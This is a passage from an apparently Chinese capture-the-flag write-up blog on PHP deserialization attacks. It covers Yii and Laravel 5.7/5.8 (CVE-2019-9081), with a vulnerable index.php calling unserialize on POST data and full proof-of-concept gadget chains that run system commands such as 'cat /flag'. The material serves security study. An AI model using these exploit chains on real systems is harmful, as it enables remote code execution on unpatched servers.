class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">MultiFieldSession</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">writeCallback</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span> <span class="keyword">extends</span> <span class="title">MultiFieldSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback = [<span class="keyword">new</span> \yii\rest\IndexAction(<span class="variable">$func</span>, <span class="variable">$param</span>), <span class="string">&quot;run&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">base</span>\<span class="title">BaseObject</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> \yii\web\DbSession(<span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">exp</span> = <span class="title">new</span> \<span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>(&#x27;<span class="title">exec</span>&#x27;, &#x27;<span class="title">cp</span> /<span class="title">fla</span>* <span class="title">tari</span>.<span class="title">txt</span>&#x27;);</span><br><span class="line">    <span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$exp</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420125301-90d07246-ece9-404a-9b93-f02ffe447e39.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420125301-90d07246-ece9-404a-9b93-f02ffe447e39.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420139173-9f91c03f-cc54-4861-95c7-9cecfd86da3c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616420139173-9f91c03f-cc54-4861-95c7-9cecfd86da3c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web271-Laravel-5-7-框架-CVE"><a href="#web271-Laravel-5-7-框架-CVE" class="headerlink" title="web271 Laravel 5.7 框架 CVE"></a>web271 Laravel 5.7 框架 CVE</h2><span class='btn'><a class="button"  title='PHP/7.1.26'><i class='fas fa-tag'></i>PHP/7.1.26</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='CVE-2019-9081'><i class='fas fa-tag'></i>CVE-2019-9081</a></span> <span class='btn'><a class="button"  title='Laravel 5.7登录前'><i class='fas fa-tag'></i>Laravel 5.7登录前</a></span><p><a href="https://github.com/laravel/laravel/tree/5.7">源码</a></p><p><a href="https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/">可参考文章</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Laravel - A PHP Framework For Web Artisans</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>  Laravel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Taylor Otwell &lt;taylor<span class="doctag">@laravel</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;LARAVEL_START&#x27;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Register The Auto Loader</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Composer provides a convenient, automatically generated class loader for</span></span><br><span class="line"><span class="comment">| our application. We just need to utilize it! We&#x27;ll simply require it</span></span><br><span class="line"><span class="comment">| into the script here so that we don&#x27;t have to worry about manual</span></span><br><span class="line"><span class="comment">| loading any of our classes later on. It feels great to relax.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Turn On The Lights</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| We need to illuminate PHP development, so let us turn on the lights.</span></span><br><span class="line"><span class="comment">| This bootstraps the framework and gets it ready for use, then it</span></span><br><span class="line"><span class="comment">| will load up this application so that we can run it and send</span></span><br><span class="line"><span class="comment">| the responses back to the browser and delight our users.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Run The Application</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Once we have the application, we can handle the incoming request</span></span><br><span class="line"><span class="comment">| through the kernel, and send the associated response back to</span></span><br><span class="line"><span class="comment">| the client&#x27;s browser allowing them to enjoy the creative</span></span><br><span class="line"><span class="comment">| and wonderful application we have prepared for them.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;handle(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span>-&gt;terminate(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;                 <span class="comment">//一个实例化的类 Illuminate\Auth\GenericUser</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;                   <span class="comment">//一个实例化的类 Illuminate\Foundation\Application</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;           <span class="comment">//要执行的php函数 system</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;     <span class="comment">//要执行的php函数的参数  array(&#x27;id&#x27;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">defaultgenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>(<span class="title">array</span>(&quot;<span class="title">hello</span>&quot; =&gt; &quot;<span class="title">world</span>&quot;));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> Illuminate\Foundation\Application();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="variable">$app</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;cat /flag&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因代码里是通过 POST 的 <code>data</code> 接收，所以这里是用 <code>data</code> POST 过去</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617621477463-56ff7b49-bb5a-4f57-9c95-afee8c7661e5.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617621477463-56ff7b49-bb5a-4f57-9c95-afee8c7661e5.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web272-Laravel-5-8-框架-CVE"><a href="#web272-Laravel-5-8-框架-CVE" class="headerlink" title="web272 Laravel 5.8 框架 CVE"></a>web272 Laravel 5.8 框架 CVE</h2><span class='btn'><a class="button"  title='PHP/7.1.26'><i class='fas fa-tag'></i>PHP/7.1.26</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='Laravel 5.8登录前'><i class='fas fa-tag'></i>Laravel 5.8登录前</a></span><p><a href="https://xz.aliyun.com/t/5911">可参考文章</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Laravel - A PHP Framework For Web Artisans</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>  Laravel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Taylor Otwell &lt;taylor<span class="doctag">@laravel</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;LARAVEL_START&#x27;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Register The Auto Loader</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Composer provides a convenient, automatically generated class loader for</span></span><br><span class="line"><span class="comment">| our application. We just need to utilize it! We&#x27;ll simply require it</span></span><br><span class="line"><span class="comment">| into the script here so that we don&#x27;t have to worry about manual</span></span><br><span class="line"><span class="comment">| loading any of our classes later on. It feels great to relax.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Turn On The Lights</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| We need to illuminate PHP development, so let us turn on the lights.</span></span><br><span class="line"><span class="comment">| This bootstraps the framework and gets it ready for use, then it</span></span><br><span class="line"><span class="comment">| will load up this application so that we can run it and send</span></span><br><span class="line"><span class="comment">| the responses back to the browser and delight our users.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Run The Application</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Once we have the application, we can handle the incoming request</span></span><br><span class="line"><span class="comment">| through the kernel, and send the associated response back to</span></span><br><span class="line"><span class="comment">| the client&#x27;s browser allowing them to enjoy the creative</span></span><br><span class="line"><span class="comment">| and wonderful application we have prepared for them.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;handle(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span>-&gt;terminate(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br></pre></td></tr></table></figure><p>有空会（咕咕预订…）额外写文章复现 （</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$config</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> Mockery\<span class="built_in">Generator</span>\MockDefinition(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其实还有挺多链的</p><p><a href="https://www.anquanke.com/post/id/189718">https://www.anquanke.com/post/id/189718</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629258925-4f0e4796-dcee-4930-80c7-7d7270a40549.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629258925-4f0e4796-dcee-4930-80c7-7d7270a40549.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web273-和web273一样"><a href="#web273-和web273一样" class="headerlink" title="web273 和web273一样"></a>web273 和web273一样</h2><p>PHP/7.1.32框架审计Laravel 5.8登录前</p><span class='btn'><a class="button"  title='PHP/7.1.32'><i class='fas fa-tag'></i>PHP/7.1.32</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='Laravel 5.8登录前'><i class='fas fa-tag'></i>Laravel 5.8登录前</a></span><p>emm，说实话除了PHP版本细微差别，还不知道有啥区别，竟然 poc 一毛一样</p><p>有空会（咕咕预订…）额外写文章复现 （</p><p><img 